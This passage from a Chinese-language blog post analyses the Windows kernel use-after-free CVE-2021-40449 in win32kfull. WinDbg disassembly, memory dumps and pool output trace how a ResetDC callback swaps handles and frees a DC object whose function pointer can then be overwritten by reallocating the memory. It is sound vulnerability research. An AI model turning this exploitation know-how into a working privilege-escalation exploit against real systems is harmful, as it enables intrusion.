&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c35 &lt;span style="color:#ae81ff">4889742420&lt;/span> mov qword ptr [rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>h],rsi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c3a &lt;span style="color:#ae81ff">57&lt;/span> push rdi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c3b &lt;span style="color:#ae81ff">4883&lt;/span>ec70 sub rsp,&lt;span style="color:#ae81ff">70&lt;/span>h
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c3f &lt;span style="color:#ae81ff">488&lt;/span>b05ba440800 mov rax,qword ptr [win32kfull&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">_security_cookie&lt;/span> (ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f95100)]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c46 &lt;span style="color:#ae81ff">4833&lt;/span>c4 xor rax,rsp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c49 &lt;span style="color:#ae81ff">4889442468&lt;/span> mov qword ptr [rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">68&lt;/span>h],rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c4e &lt;span style="color:#ae81ff">488&lt;/span>bf9 mov rdi,rcx
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后通过hdcOpenDCW函数调用用户模式的回调函数，在回调函数中再次调用ResetDC函数，此时传入的HDC和第一次调用ResetDC的是同一个句柄。&lt;/p>
&lt;p>
&lt;img alt="image-20211110161002502" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110161002502.png" />&lt;/p>
&lt;p>第二次调用&lt;code>win32kfull!GreResetDCInternal&lt;/code> 时，传入同一个HDC句柄，即对应同一个DC对象。&lt;/p>
&lt;pre tabindex="0">&lt;code>0: kd&amp;gt; t
win32kfull!GreResetDCInternal:
ffffd548`a1f03e58 488bc4 mov rax,rsp
1: kd&amp;gt; rrcx
rcx=00000000092105f1
&lt;/code>&lt;/pre>&lt;p>第二次调用DCOBJ构造函数时，由于传入的是同一个HDC句柄，所以HDC句柄引用次数+1，同时两次调用构造函数构造的对象关联到同一个DC对象。&lt;/p>
&lt;p>
&lt;img alt="image-20211110162021866" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110162021866.png" />&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/%E4%B8%A4%E4%B8%AA%E5%AF%B9%E8%B1%A1%E5%85%B3%E7%B3%BB%E5%9B%BE.jpg" />&lt;/p>
&lt;p>之后第二次调用win32kfull!_imp_hdcOpenDCW函数，在该函数内执行政策回调函数，win32kfull!imp_hdcOpenDCW返回一个HDC句柄值为&lt;code>0000000003210041&lt;/code>，即创建了一个新的DC对象。之后通过新创建的DC对象创建DCO对象。&lt;/p>
&lt;p>
&lt;img alt="image-20211110163914337" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110163914337.png" />&lt;/p>
&lt;p>在win32kfull!GreResetDCInternal后半段会调用win32kfull!_imp_HmgSwapLockedHandleContents交换第一个HDC句柄和第二次调用win32kfull!imp_hdcOpenDCW创建的HDC句柄。&lt;/p>
&lt;p>
&lt;img alt="image-20211110164604391" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110164604391.png" />&lt;/p>
&lt;p>调用win32kfull!_imp_HmgSwapLockedHandleContents之后两个句柄对应的DC内容为已经发生了交换&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 以下内容为旧DC对象，但是句柄为新句柄
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffd50e041fd010
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d010 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">03210041&lt;/span> &lt;span style="color:#ae81ff">80000001&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffd50e03fee010
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 以下内容为新DC对象，但句柄为旧句柄
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">03f&lt;/span>ee010 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">092105f&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">80000002&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后调用win32kfull!_imp_bDeleteDCInternal传入HDC句柄，该函数会释放HDC句柄对应的DC对象，而此时传入该函数的HDC句柄为第二次调用hdcOpenDCW函数返回的句柄，但之前交换过新旧句柄，所以实际上释放的是旧HDC句柄对应的DC对象。&lt;/p>
&lt;p>
&lt;img alt="image-20211110164912079" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110164912079.png" />&lt;/p>
&lt;p>之前计算函数指针的时候，我们知道DCO +0x30是指向DC对象的指针，所以在调用win32kfull!_imp_bDeleteDCInternal函数之后，原DC对象的内存空间已经被释放，达成了use-after-free的第一步free。&lt;/p>
&lt;blockquote>
&lt;p>function pointer=* (* (DCO +0x30)+0xad0)，其中DCO +0x30即指向DC对象的指针&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffd50e041fd010&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x30&lt;/span> &lt;span style="color:#75715e">// 取DC对象地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d040 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052030&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>pool ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052030&lt;/span> &lt;span style="color:#75715e">// DC对象的内存已被释放，大小为e30
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>Pool page ffffd50e00052030 region is Paged session pool
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">*&lt;/span>ffffd50e00052000 size: e30 previous size: &lt;span style="color:#ae81ff">0&lt;/span> (Free ) &lt;span style="color:#f92672">*&lt;/span>GDev
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Pooltag GDev : Gdi pdev
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ffffd50e00052e30 size: &lt;span style="color:#ae81ff">10&lt;/span> previous size: &lt;span style="color:#a6e22e">e30&lt;/span> (Free) Free
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ffffd50e00052e40 size: &lt;span style="color:#ae81ff">1&lt;/span>c0 previous size: &lt;span style="color:#ae81ff">10&lt;/span> (Allocated) Usqu
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后只需要申请这块内存空间并构造，刚删除的时候，虽然DC对象已经被释放，但函数指针还是指向正确的函数地址，接下来就要申请空间，覆盖这块内存空间的函数指针的值即可。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffd50e041fd010&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x30&lt;/span> &lt;span style="color:#75715e">// 取DC对象地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">041f&lt;/span>d040 ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052030&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052030&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0xad0&lt;/span> &lt;span style="color:#75715e">// 取DC对象内的函数指针
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>ffffd50e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00052&lt;/span>b00 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c30 ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1db18c0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> u ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c30
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>win32kfull&lt;span style="color:#f92672">!&lt;/span>UMPDDrvResetPDEV:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c30 &lt;span style="color:#ae81ff">48895&lt;/span>c2418 mov qword ptr [rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>h],rbx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c35 &lt;span style="color:#ae81ff">4889742420&lt;/span> mov qword ptr [rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>h],rsi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c3a &lt;span style="color:#ae81ff">57&lt;/span> push rdi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c3b &lt;span style="color:#ae81ff">4883&lt;/span>ec70 sub rsp,&lt;span style="color:#ae81ff">70&lt;/span>h
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c3f &lt;span style="color:#ae81ff">488&lt;/span>b05ba440800 mov rax,qword ptr [win32kfull&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">_security_cookie&lt;/span> (ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f95100)]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c46 &lt;span style="color:#ae81ff">4833&lt;/span>c4 xor rax,rsp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c49 &lt;span style="color:#ae81ff">4889442468&lt;/span> mov qword ptr [rsp&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">68&lt;/span>h],rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffffd548&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a1f10c4e &lt;span style="color:#ae81ff">488&lt;/span>bf9 mov rdi,rcx
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="use-部分">use 部分&lt;/h4>
&lt;p>注：此部分为第二次调试，所以句柄、内存地址和前部分不一样。&lt;/p>
&lt;p>在poc里面会调用CreatePalette函数，该此函数会申请内核堆，&lt;/p>
&lt;p>第一个句柄&lt;code>rcx=0000000015213372&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 第一个DCO对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq rbx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DBGHELP: SharedUserData &lt;span style="color:#f92672">-&lt;/span> virtual symbol module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">847&lt;/span>d2620 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">15213372&lt;/span> &lt;span style="color:#ae81ff">80000001&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 第一个PDC 指向DC对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">847&lt;/span>d2620&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x30&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">847&lt;/span>d2650 ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063030&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 第一个DC对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063030&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063030&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063040&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80046010&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063050&lt;/span> &lt;span style="color:#ae81ff">00000001&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000001&lt;/span> ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063030&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063060&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">0000&lt;/span>&lt;span style="color:#ae81ff">8180&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063070&lt;/span> ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a36b4e50 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063080&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063090&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">800630&lt;/span>a0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>第二个句柄&lt;code>rax=0000000001211b60&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq rdx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DBGHELP: SharedUserData &lt;span style="color:#f92672">-&lt;/span> virtual symbol module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">84121620&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">01211&lt;/span>b60 &lt;span style="color:#ae81ff">80000001&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq rdx&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x30&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">84121650&lt;/span> ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b030 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> kd&lt;span style="color:#f92672">&amp;gt;&lt;/span> dq ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b030
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b030 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b040 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">80063030&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b050 &lt;span style="color:#ae81ff">00000001&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000001&lt;/span> ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b030
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b060 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">0000&lt;/span>&lt;span style="color:#ae81ff">8180&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b070 ffffb48d&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>a317b8b0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b080 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b090 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ffff885e&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">8006&lt;/span>b0a0 &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span> &lt;span style="color:#ae81ff">00000000&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">00000000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在DeleteDCInternel调用之后第一个DC对象的内存空间已经被释放&lt;/p>
